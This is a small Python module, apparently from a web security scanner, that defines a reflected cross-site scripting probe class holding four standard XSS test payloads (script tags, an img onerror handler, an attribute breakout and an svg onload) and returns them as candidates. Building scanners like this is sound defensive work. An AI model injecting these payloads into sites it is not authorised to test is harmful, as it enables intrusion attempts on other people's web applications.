"""Reflected XSS probe module."""

from typing import List


class XSSProbe:
    """Specialized Reflected Cross-Site Scripting (XSS) payload vectors."""

    DEFAULT_PAYLOADS: List[str] = [
        "<script>alert(1)</script>",
        "<img src=x onerror=alert(1)>",
        "\"><script>alert('shipcheck')</script>",
        "<svg/onload=alert(1)>",
    ]

    @staticmethod
    def get_candidate_payloads() -> List[str]:
        return list(XSSProbe.DEFAULT_PAYLOADS)
